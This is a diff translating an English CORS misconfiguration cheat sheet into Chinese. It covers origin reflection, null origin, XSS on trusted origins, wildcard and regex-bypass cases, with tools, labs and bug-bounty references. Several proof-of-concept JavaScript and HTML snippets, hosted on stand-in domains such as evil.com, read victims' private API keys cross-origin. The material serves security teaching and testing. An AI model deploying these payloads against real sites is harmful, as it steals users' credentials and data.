@@ -1,41 +1,43 @@
-# CORS Misconfiguration
+# CORS 配置错误
 
-> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials.
+[原文文档](README.en.md)
 
-## Summary
+> API 域存在全站 CORS 配置错误。这允许攻击者代表用户发出跨域请求，因为应用程序没有白名单 Origin 头并具有 Access-Control-Allow-Credentials: true，这意味着我们可以使用受害者的凭证从攻击者的网站发出请求。
 
-* [Tools](#tools)
-* [Requirements](#requirements)
-* [Methodology](#methodology)
-    * [Origin Reflection](#origin-reflection)
-    * [Null Origin](#null-origin)
-    * [XSS on Trusted Origin](#xss-on-trusted-origin)
-    * [Wildcard Origin without Credentials](#wildcard-origin-without-credentials)
-    * [Expanding the Origin](#expanding-the-origin)
-* [Labs](#labs)
-* [References](#references)
+## 概要
 
-## Tools
+* [工具](#工具)
+* [要求](#要求)
+* [方法论](#方法论)
+    * [Origin 反射](#origin-反射)
+    * [空 Origin](#空-origin)
+    * [受信任 Origin 上的 XSS](#受信任-origin-上的-xss)
+    * [不带凭证的通配符 Origin](#不带凭证的通配符-origin)
+    * [扩展 Origin](#扩展-origin)
+* [实验室](#实验室)
+* [参考资料](#参考资料)
 
-* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
-* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
-* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
-* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
-* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
+## 工具
 
-## Requirements
+* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS 配置错误扫描器
+* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - 快速 CORS 配置错误漏洞扫描器
+* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC 构建器
+* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - 利用内部网络上的 CORS 配置错误
+* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - 快速 CORS 配置错误发现工具
 
-* BURP HEADER> `Origin: https://evil.com`
-* VICTIM HEADER> `Access-Control-Allow-Credential: true`
-* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`
+## 要求
 
-## Methodology
+* 攻击者头：`Origin: https://evil.com`
+* 受害者头：`Access-Control-Allow-Credential: true`
+* 受害者头：`Access-Control-Allow-Origin: https://evil.com` 或 `Access-Control-Allow-Origin: null`
 
-Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target `https://victim.example.com/endpoint`.
+## 方法论
 
-### Origin Reflection
+通常您想要针对 API 端点。使用以下载荷在目标 `https://victim.example.com/endpoint` 上利用 CORS 配置错误。
 
-#### Vulnerable Implementation
+### Origin 反射
+
+#### 易受攻击的实现
 
 ```powershell
 GET /endpoint HTTP/1.1
@@ -50,9 +52,9 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof Of Concept
+#### 概念验证
 
-This PoC requires that the respective JS script is hosted at `evil.com`
+此 PoC 要求相应的 JS 脚本托管在 `evil.com`
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -66,14 +68,14 @@ function reqListener() {
 };
 ```
 
-or
+或者
 
 ```html
 <html>
      <body>
          <h2>CORS PoC</h2>
          <div id="demo">
-             <button type="button" onclick="cors()">Exploit</button>
+             <button type="button" onclick="cors()">利用</button>
          </div>
          <script>
              function cors() {
@@ -93,13 +95,11 @@ or
  </html>
 ```
 
-### Null Origin
+### 空 Origin
 
-#### Vulnerable Implementation
+#### 易受攻击的实现
 
-It's possible that the server does not reflect the complete `Origin` header but
-that the `null` origin is allowed. This would look like this in the server's
-response:
+服务器可能不会反射完整的 `Origin` 头，但允许 `null` origin。这在服务器的响应中看起来像这样：
 
 ```ps1
 GET /endpoint HTTP/1.1
@@ -114,11 +114,9 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof Of Concept
+#### 概念验证
 
-This can be exploited by putting the attack code into an iframe using the data
-URI scheme. If the data URI scheme is used, the browser will use the `null`
-origin in the request:
+可以通过使用 data URI 方案将攻击代码放入 iframe 来利用此漏洞。如果使用 data URI 方案，浏览器将在请求中使用 `null` origin：
 
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
@@ -134,31 +132,24 @@ origin in the request:
 </script>"></iframe> 
 ```
 
-### XSS on Trusted Origin
+### 受信任 Origin 上的 XSS
 
-If the application does implement a strict whitelist of allowed origins, the
-exploit codes from above do not work. But if you have an XSS on a trusted
-origin, you can inject the exploit coded from above in order to exploit CORS
-again.
+如果应用程序确实实现了受信任 Origin 的严格白名单，上面的利用代码将不起作用。但如果您在受信任的 Origin 上有 XSS，您可以注入上面的利用代码来再次利用 CORS。
 
 ```ps1
 https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
 ```
 
-### Wildcard Origin without Credentials
+### 不带凭证的通配符 Origin
 
-If the server responds with a wildcard origin `*`, **the browser does never send
-the cookies**. However, if the server does not require authentication, it's still
-possible to access the data on the server. This can happen on internal servers
-that are not accessible from the Internet. The attacker's website can then
-pivot into the internal network and access the server's data without authentication.
+如果服务器响应通配符 origin `*`，**浏览器永远不会发送 cookie**。但是，如果服务器不需要身份验证，仍然可以访问服务器上的数据。这可能发生在不能从互联网访问的内部服务器上。攻击者的网站然后可以渗透到内部网络并在没有身份验证的情况下访问服务器的数据。
 
 ```powershell
-* is the only wildcard origin
-https://*.example.com is not valid
+* 是唯一的通配符 origin
+https://*.example.com 无效
 ```
 
-#### Vulnerable Implementation
+#### 易受攻击的实现
 
 ```powershell
 GET /endpoint HTTP/1.1
@@ -171,7 +162,7 @@ Access-Control-Allow-Origin: *
 {"[private API key]"}
 ```
 
-#### Proof Of Concept
+#### 概念验证
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -184,13 +175,13 @@ function reqListener() {
 };
 ```
 
-### Expanding the Origin
+### 扩展 Origin
 
-Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.
+有时，原始 Origin 的某些扩展不会在服务器端被过滤。这可能是由于使用实现不良的正则表达式来验证 origin 头造成的。
 
-#### Vulnerable Implementation (Example 1)
+#### 易受攻击的实现（示例 1）
 
-In this scenario any prefix inserted in front of `example.com` will be accepted by the server.
+在这种情况下，插入到 `example.com` 之前的任何前缀都将被服务器接受。
 
 ```ps1
 GET /endpoint HTTP/1.1
@@ -204,9 +195,9 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof of Concept (Example 1)
+#### 概念验证（示例 1）
 
-This PoC requires the respective JS script to be hosted at `evilexample.com`
+此 PoC 要求相应的 JS 脚本托管在 `evilexample.com`
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -220,9 +211,9 @@ function reqListener() {
 };
 ```
 
-#### Vulnerable Implementation (Example 2)
+#### 易受攻击的实现（示例 2）
 
-In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.
+在这种情况下，服务器使用正则表达式，其中点未正确转义。例如，类似这样的东西：`^api.example.com$` 而不是 `^api\.example.com$`。因此，点可以用任何字母替换以从第三方域获得访问。
 
 ```ps1
 GET /endpoint HTTP/1.1
@@ -236,9 +227,9 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof of concept (Example 2)
+#### 概念验证（示例 2）
 
-This PoC requires the respective JS script to be hosted at `apiiexample.com`
+此 PoC 要求相应的 JS 脚本托管在 `apiiexample.com`
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -252,23 +243,23 @@ function reqListener() {
 };
 ```
 
-## Labs
+## 实验室
 
-* [PortSwigger - CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
-* [PortSwigger - CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
-* [PortSwigger - CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
-* [PortSwigger - CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
+* [PortSwigger - 基本 Origin 反射攻击的 CORS 漏洞](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+* [PortSwigger - 受信任空 Origin 白名单攻击的 CORS 漏洞](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
+* [PortSwigger - 受信任不安全协议的 CORS 漏洞](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
+* [PortSwigger - 内部网络渗透攻击的 CORS 漏洞](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
 
-## References
+## 参考资料
 
-* [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) - December 20, 2018](https://hackerone.com/reports/470298)
-* [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
-* [CORS misconfig | Account Takeover - Rohan (nahoragg) - October 20, 2018](https://hackerone.com/reports/426147)
-* [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) - October 29, 2018](https://hackerone.com/reports/430249)
-* [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) - September 15, 2016](https://hackerone.com/reports/168574)
-* [CORS Misconfigurations Explained - Detectify Blog - April 26, 2018](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
-* [Cross-origin resource sharing (CORS) - PortSwigger Web Security Academy - December 30, 2019](https://portswigger.net/web-security/cors)
-* [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) - June 1, 2017](https://hackerone.com/reports/235200)
-* [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle - 14 October 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
-* [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - December 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
-* [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
+* [[██████] 跨源资源共享配置错误 (CORS) - Vadim (jarvis7) - 2018年12月20日](https://hackerone.com/reports/470298)
+* [高级 CORS 利用技术 - Corben Leo - 2018年6月16日](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
+* [CORS 配置错误 | 账户接管 - Rohan (nahoragg) - 2018年10月20日](https://hackerone.com/reports/426147)
+* [CORS 配置错误导致私人信息泄露 - sandh0t (sandh0t) - 2018年10月29日](https://hackerone.com/reports/430249)
+* [www.zomato.com 上的 CORS 配置错误 - James Kettle (albinowax) - 2016年9月15日](https://hackerone.com/reports/168574)
+* [CORS 配置错误解释 - Detectify 博客 - 2018年4月26日](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
+* [跨源资源共享 (CORS) - PortSwigger Web 安全学院 - 2019年12月30日](https://portswigger.net/web-security/cors)
+* [跨源资源共享配置错误 | 窃取用户信息 - bughunterboy (bughunterboy) - 2017年6月1日](https://hackerone.com/reports/235200)
+* [利用 CORS 配置错误获取比特币和赏金 - James Kettle - 2016年10月14日](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
+* [利用配置错误的 CORS（跨源资源共享） - Geekboy - 2016年12月16日](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
+* [跳出范围思考：高级 CORS 利用技术 - Ayoub Safa (Sandh0t) - 2019年5月14日](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
